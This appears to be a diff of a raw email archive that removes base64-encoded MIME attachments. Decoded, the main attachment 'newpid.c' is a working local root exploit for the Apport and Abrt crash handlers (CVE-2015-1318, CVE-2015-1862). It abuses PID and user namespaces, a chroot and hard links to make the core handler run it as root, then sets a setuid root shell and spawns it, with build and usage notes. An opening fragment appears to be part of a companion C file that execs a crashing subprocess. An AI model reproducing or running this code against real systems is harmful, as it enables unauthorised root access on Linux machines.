-ZWQgZmlsZW5hbWUKICAgICAgICBuZXduYW1lID0gdG1wbmFtKDApOwoKICAg
-ICAgICAvLyBNYWtlIHN1cmUgd2UncmUgbm90IHRvbyBmYXN0LgogICAgICAg
-IHVzbGVlcChrQ3Jhc2hEZWxheSk7CgogICAgICAgIC8vIENyZWF0ZSBhIG5l
-dyBjcmFzaGluZyBzdWJwcm9jZXNzLgogICAgICAgIGlmICgocGlkID0gZm9y
-aygpKSA9PSAwKSB7CiAgICAgICAgICAgIGlmIChsaW5rKG5hbWUsIG5ld25h
-bWUpICE9IDApIHsKICAgICAgICAgICAgICAgIGVycihFWElUX0ZBSUxVUkUs
-ICJmYWlsZWQgdG8gY3JlYXRlIGEgbmV3IGV4ZW5hbWUiKTsKICAgICAgICAg
-ICAgfQoKICAgICAgICAgICAgLy8gRXhlY3V0ZSBjcmFzaGluZyBwcm9jZXNz
-LgogICAgICAgICAgICBleGVjbChuZXduYW1lLCBuZXduYW1lLCAiY3Jhc2gi
-LCBOVUxMKTsKCiAgICAgICAgICAgIC8vIFRoaXMgc2hvdWxkIGFsd2F5cyB3
-b3JrLgogICAgICAgICAgICBlcnIoRVhJVF9GQUlMVVJFLCAidW5leHBlY3Rl
-ZCBleGVjdmUgZmFpbHVyZSIpOwogICAgICAgIH0KCiAgICAgICAgLy8gUmVh
-cCBjcmFzaGVkIHN1YnByb2Nlc3MuCiAgICAgICAgaWYgKHdhaXRwaWQocGlk
-LCAmc3RhdHVzLCAwKSAhPSBwaWQpIHsKICAgICAgICAgICAgZXJyKEVYSVRf
-RkFJTFVSRSwgIndhaXRwaWQgZmFpbHVyZSIpOwogICAgICAgIH0KCiAgICAg
-ICAgLy8gQ2xlYW4gdXAgdGhlIHRlbXBvcmFyeSBuYW1lLgogICAgICAgIGlm
-ICh1bmxpbmsobmV3bmFtZSkgIT0gMCkgewogICAgICAgICAgICBlcnIoRVhJ
-VF9GQUlMVVJFLCAiZmFpbGVkIHRvIGNsZWFuIHVwIik7CiAgICAgICAgfQoK
-ICAgICAgICAvLyBNYWtlIHN1cmUgaXQgY3Jhc2hlZCBhcyBleHBlY3RlZC4K
-ICAgICAgICBpZiAoIVdJRlNJR05BTEVEKHN0YXR1cykpIHsKICAgICAgICAg
-ICAgZXJyeChFWElUX0ZBSUxVUkUsICJzb21ldGhpbmcgd2VudCB3cm9uZyIp
-OwogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gY2hpbGQ7Cn0K
-
---001a11c13c46e6b39a0513af3d2e
-Content-Type: text/x-csrc; charset=US-ASCII; name="newpid.c"
-Content-Disposition: attachment; filename="newpid.c"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_i8hc4ss21
-
-I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1
-ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxm
-Y250bC5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CiNpbmNsdWRlIDxlbGYuaD4K
-I2luY2x1ZGUgPGVyci5oPgojaW5jbHVkZSA8c3lzbG9nLmg+CiNpbmNsdWRl
-IDxzY2hlZC5oPgojaW5jbHVkZSA8bGludXgvc2NoZWQuaD4KI2luY2x1ZGUg
-PHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUg
-PHN5cy9hdXh2Lmg+CiNpbmNsdWRlIDxzeXMvd2FpdC5oPgoKIyB3YXJuaW5n
-IHRoaXMgZmlsZSBtdXN0IGJlIGNvbXBpbGVkIHdpdGggLXN0YXRpYwoKLy8K
-Ly8gQXBwb3J0L0FicnQgVnVsbmVyYWJpbGl0eSBEZW1vIEV4cGxvaXQuCi8v
-Ci8vICBBcHBvcnQ6IENWRS0yMDE1LTEzMTgKLy8gIEFicnQ6ICAgQ1ZFLTIw
-MTUtMTg2MgovLyAKLy8gICAtLSB0YXZpc29AY21weGNoZzhiLmNvbSwgQXBy
-aWwgMjAxNS4KLy8KLy8gJCBnY2MgLXN0YXRpYyBuZXdwaWQuYwovLyAkIC4v
-YS5vdXQKLy8gdWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9v
-dCkKLy8gc2gtNC4zIyBleGl0Ci8vIGV4aXQKLy8KLy8gSGludDogVG8gZ2V0
-IGxpYmMuYSwKLy8gIHl1bSBpbnN0YWxsIGdsaWJjLXN0YXRpYyBvciBhcHQt
-Z2V0IGluc3RhbGwgbGliYzYtZGV2Ci8vCgppbnQgbWFpbihpbnQgYXJnYywg
-Y2hhciAqKmFyZ3YpCnsKICAgIGludCBzdGF0dXM7CiAgICBFbGYzMl9QaGRy
-ICpoZHI7CiAgICBwaWRfdCB3cmFwcGVyOwogICAgcGlkX3QgaW5pdDsKICAg
-IHBpZF90IHN1YnByb2Nlc3M7CiAgICB1bnNpZ25lZCBpOwoKICAgIC8vIFZl
-cmlmeSB0aGlzIGlzIGEgc3RhdGljIGV4ZWN1dGFibGUgYnkgY2hlY2tpbmcg
-dGhlIHByb2dyYW0gaGVhZGVycyBmb3IgYQogICAgLy8gZHluYW1pYyBzZWdt
-ZW50LiBPcmlnaW5hbGx5IEkgdGhvdWdodCBqdXN0IGNoZWNraW5nIEFUX0JB
-U0Ugd291bGQgd29yaywKICAgIC8vIGJ1dCB0aGF0IGlzbnQgcmVsaWFibGUg
-YWNyb3NzIG1hbnkga2VybmVscy4KICAgIGhkciA9ICh2b2lkICopIGdldGF1
-eHZhbChBVF9QSERSKTsKCiAgICAvLyBJZiB3ZSBmaW5kIGFueSBQVF9EWU5B
-TUlDLCB0aGVuIHRoaXMgaXMgcHJvYmFibHkgbm90IGEgc3RhdGljIGJpbmFy
-eS4KICAgIGZvciAoaSA9IDA7IGkgPCBnZXRhdXh2YWwoQVRfUEhOVU0pOyBp
-KyspIHsKICAgICAgICBpZiAoaGRyW2ldLnBfdHlwZSA9PSBQVF9EWU5BTUlD
-KSB7CiAgICAgICAgICAgIGVycngoRVhJVF9GQUlMVVJFLCAieW91ICptdXN0
-KiBjb21waWxlIHdpdGggLXN0YXRpYyIpOwogICAgICAgIH0KICAgIH0KCiAg
-ICAvLyBJZiBleGVjdXRpb24gcmVhY2hlZCBoZXJlLCBpdCBsb29rcyBsaWtl
-IHdlJ3JlIGEgc3RhdGljIGV4ZWN1dGFibGUuIElmCiAgICAvLyBJJ20gcm9v
-dCwgdGhlbiB3ZSd2ZSBjb252aW5jZWQgdGhlIGNvcmUgaGFuZGxlciB0byBy
-dW4gdXMsIHNvIGNyZWF0ZSBhCiAgICAvLyBzZXR1aWQgcm9vdCBleGVjdXRh
-YmxlIHRoYXQgY2FuIGJlIHVzZWQgb3V0c2lkZSB0aGUgY2hyb290LgogICAg
-aWYgKGdldHVpZCgpID09IDApIHsKICAgICAgICBpZiAoY2hvd24oInNoIiwg
-MCwgMCkgIT0gMCkKICAgICAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOwoK
-ICAgICAgICBpZiAoY2htb2QoInNoIiwgMDQ3NTUpICE9IDApCiAgICAgICAg
-ICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsKCiAgICAgICAgcmV0dXJuIEVYSVRf
-U1VDQ0VTUzsKICAgIH0KCiAgICAvLyBJZiBJJ20gbm90IHJvb3QsIGJ1dCBl
-dWlkIGlzIDAsIHRoZW4gdGhlIGV4cGxvaXQgd29ya2VkIGFuZCB3ZSBjYW4g
-c3Bhd24KICAgIC8vIGEgc2hlbGwgYW5kIGNsZWFudXAuCiAgICBpZiAoc2V0
-dWlkKDApID09IDApIHsKICAgICAgICBzeXN0ZW0oImlkIik7CiAgICAgICAg
-c3lzdGVtKCJybSAtcmYgZXhwbG9pdCIpOwogICAgICAgIGV4ZWNscCgic2gi
-LCAic2giLCBOVUxMKTsKCiAgICAgICAgLy8gU29tZXRoaW5nIHdlbnQgd3Jv
-bmcuCiAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgImZhaWxlZCB0byBzcGF3
-biByb290IHNoZWxsLCBidXQgZXhwbG9pdCB3b3JrZWQiKTsKICAgIH0KCiAg
-ICAvLyBJdCBsb29rcyBsaWtlIHRoZSBleHBsb2l0IGhhc24ndCBydW4geWV0
-LCBzbyBjcmVhdGUgYSBjaHJvb3QuCiAgICBpZiAobWtkaXIoImV4cGxvaXQi
-LCAwNzU1KSAhPSAwCiAgICAgfHwgbWtkaXIoImV4cGxvaXQvdXNyIiwgMDc1
-NSkgIT0gMAogICAgIHx8IG1rZGlyKCJleHBsb2l0L3Vzci9zaGFyZSIsIDA3
-NTUpICE9IDAKICAgICB8fCBta2RpcigiZXhwbG9pdC91c3Ivc2hhcmUvYXBw
-b3J0IiwgMDc1NSkgIT0gMAogICAgIHx8IG1rZGlyKCJleHBsb2l0L3Vzci9s
-aWJleGVjIiwgMDc1NSkgIT0gMCkgewogICAgICAgIGVycihFWElUX0ZBSUxV
-UkUsICJmYWlsZWQgdG8gY3JlYXRlIGNocm9vdCBkaXJlY3RvcnkiKTsKICAg
-IH0KCiAgICAvLyBDcmVhdGUgbGlua3MgdG8gdGhlIGV4cGxvaXQgbG9jYXRp
-b25zIHdlIG5lZWQuCiAgICBpZiAobGluaygqYXJndiwgImV4cGxvaXQvc2gi
-KSAhPSAwCiAgICAgfHwgbGluaygqYXJndiwgImV4cGxvaXQvdXNyL3NoYXJl
-L2FwcG9ydC9hcHBvcnQiKSAhPSAwICAgICAgICAvLyBVYnVudHUKICAgICB8
-fCBsaW5rKCphcmd2LCAiZXhwbG9pdC91c3IvbGliZXhlYy9hYnJ0LWhvb2st
-Y2NwcCIpICE9IDApIHsgIC8vIEZlZG9yYQogICAgICAgIGVycihFWElUX0ZB
-SUxVUkUsICJmYWlsZWQgdG8gY3JlYXRlIHJlcXVpcmVkIGhhcmQgbGlua3Mi
-KTsKICAgIH0KCiAgICAvLyBDcmVhdGUgYSBzdWJwcm9jZXNzIHNvIHdlIGRv
-bid0IGVudGVyIHRoZSBuZXcgbmFtZXNwYWNlLgogICAgaWYgKCh3cmFwcGVy
-ID0gZm9yaygpKSA9PSAwKSB7CgogICAgICAgIC8vIEluIHRoZSBjaGlsZCBw
-cm9jZXNzLCBjcmVhdGUgYSBuZXcgcGlkIGFuZCB1c2VyIG5zLiBUaGUgcGlk
-CiAgICAgICAgLy8gbmFtZXNwYWNlIGlzIG9ubHkgbmVlZGVkIG9uIFVidW50
-dSwgYmVjYXVzZSB0aGV5IGNoZWNrIGZvciAlUCAhPSAlcAogICAgICAgIC8v
-IGluIHRoZWlyIGNvcmUgaGFuZGxlci4gT24gRmVkb3JhLCBqdXN0IGEgdXNl
-ciBucyBpcyBzdWZmaWNpZW50LgogICAgICAgIGlmICh1bnNoYXJlKENMT05F
-X05FV1BJRCB8IENMT05FX05FV1VTRVIpICE9IDApCiAgICAgICAgICAgIGVy
-cihFWElUX0ZBSUxVUkUsICJmYWlsZWQgdG8gY3JlYXRlIG5ldyBuYW1lc3Bh
-Y2UiKTsKCiAgICAgICAgLy8gQ3JlYXRlIGEgcHJvY2VzcyBpbiB0aGUgbmV3
-IG5hbWVzcGFjZS4KICAgICAgICBpZiAoKGluaXQgPSBmb3JrKCkpID09IDAp
-IHsKCiAgICAgICAgICAgIC8vIEluaXQgKHBpZCAxKSBzaWduYWwgaGFuZGxp
-bmcgaXMgc3BlY2lhbCwgc28gbWFrZSBhIHN1YnByb2Nlc3MgdG8KICAgICAg
-ICAgICAgLy8gaGFuZGxlIHRoZSB0cmFwcy4KICAgICAgICAgICAgaWYgKChz
-dWJwcm9jZXNzID0gZm9yaygpKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAv
-LyBDaGFuZ2UgL3Byb2Mvc2VsZi9yb290LCB3aGljaCB3ZSBjYW4gZG8gYXMg
-d2UncmUgcHJpdmlsZWdlZAogICAgICAgICAgICAgICAgLy8gd2l0aGluIHRo
-ZSBuZXcgbmFtZXBhY2UuCiAgICAgICAgICAgICAgICBpZiAoY2hyb290KCJl
-eHBsb2l0IikgIT0gMCkgewogICAgICAgICAgICAgICAgICAgIGVycihFWElU
-X0ZBSUxVUkUsICJjaHJvb3QgZGlkbnQgd29yayIpOwogICAgICAgICAgICAg
-ICAgfQoKICAgICAgICAgICAgICAgIC8vIE5vdyB0cmFwIHRvIGdldCB0aGUg
-Y29yZSBoYW5kbGVyIGludm9rZWQuCiAgICAgICAgICAgICAgICBfX2J1aWx0
-aW5fdHJhcCgpOwoKICAgICAgICAgICAgICAgIC8vIFNob3VsZG4ndCBoYXBw
-ZW4sIHVubGVzcyB1c2VyIGlzIHB0cmFjaW5nIHVzIG9yIHNvbWV0aGluZy4K
-ICAgICAgICAgICAgICAgIGVycihFWElUX0ZBSUxVUkUsICJjb3JlZHVtcCBm
-YWlsZWQsIHdlcmUgeW91IHB0cmFjaW5nPyIpOwogICAgICAgICAgICB9Cgog
-ICAgICAgICAgICAvLyBJZiB0aGUgc3VicHJvY2VzcyBleGl0ZWQgd2l0aCBh
-biBhYm5vcm1hbCBzaWduYWwsIHRoZW4gZXZlcnl0aGluZyB3b3JrZWQuCiAg
-ICAgICAgICAgIGlmICh3YWl0cGlkKHN1YnByb2Nlc3MsICZzdGF0dXMsIDAp
-ID09IHN1YnByb2Nlc3MpICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIFdJ
-RlNJR05BTEVEKHN0YXR1cykKICAgICAgICAgICAgICAgICAgICAgICAgPyBF
-WElUX1NVQ0NFU1MKICAgICAgICAgICAgICAgICAgICAgICAgOiBFWElUX0ZB
-SUxVUkU7CgogICAgICAgICAgICAvLyBTb21ldGhpbmcgZGlkbid0IHdvcmsu
-CiAgICAgICAgICAgIHJldHVybiBFWElUX0ZBSUxVUkU7CiAgICAgICAgfQoK
-ICAgICAgICAvLyBUaGUgbmV3IG5hbWVzcGFjZSBkaWRuJ3Qgd29yay4KICAg
-ICAgICBpZiAod2FpdHBpZChpbml0LCAmc3RhdHVzLCAwKSA9PSBpbml0KQog
-ICAgICAgICAgICByZXR1cm4gV0lGRVhJVEVEKHN0YXR1cykgJiYgV0VYSVRT
-VEFUVVMoc3RhdHVzKSA9PSBFWElUX1NVQ0NFU1MKICAgICAgICAgICAgICAg
-ICAgICA/IEVYSVRfU1VDQ0VTUwogICAgICAgICAgICAgICAgICAgIDogRVhJ
-VF9GQUlMVVJFOwoKICAgICAgICAvLyBXYWl0cGlkIGZhaWx1cmUuCiAgICAg
-ICAgcmV0dXJuIEVYSVRfRkFJTFVSRTsKICAgIH0KCiAgICAvLyBJZiB0aGUg
-c3VicHJvY2VzcyByZXR1cm5lZCBzY2Nlc3MsIHRoZSBleHBsb2l0IHByb2Jh
-Ymx5IHdvcmtlZCwgcmVsb2FkCiAgICAvLyB3aXRoIGV1aWQgemVyby4KICAg
-IGlmICh3YWl0cGlkKHdyYXBwZXIsICZzdGF0dXMsIDApID09IHdyYXBwZXIp
-IHsKICAgICAgICAvLyBBbGwgZG9uZSwgc3Bhd24gcm9vdCBzaGVsbC4KICAg
-ICAgICBpZiAoV0lGRVhJVEVEKHN0YXR1cykgJiYgV0VYSVRTVEFUVVMoc3Rh
-dHVzKSA9PSAwKSB7CiAgICAgICAgICAgIGV4ZWNsKCphcmd2LCAidzAwdCIs
-IE5VTEwpOwogICAgICAgIH0KICAgIH0KCiAgICAvLyBVbmtub3duIGVycm9y
-LgogICAgZXJyeChFWElUX0ZBSUxVUkUsICJ1bmV4cGVjdGVkIHJlc3VsdCwg
-Y2Fubm90IGNvbnRpbnVlIik7Cn0K
-
---001a11c13c46e6b39a0513af3d2e--
+--00000000000068cd0105c9463107--
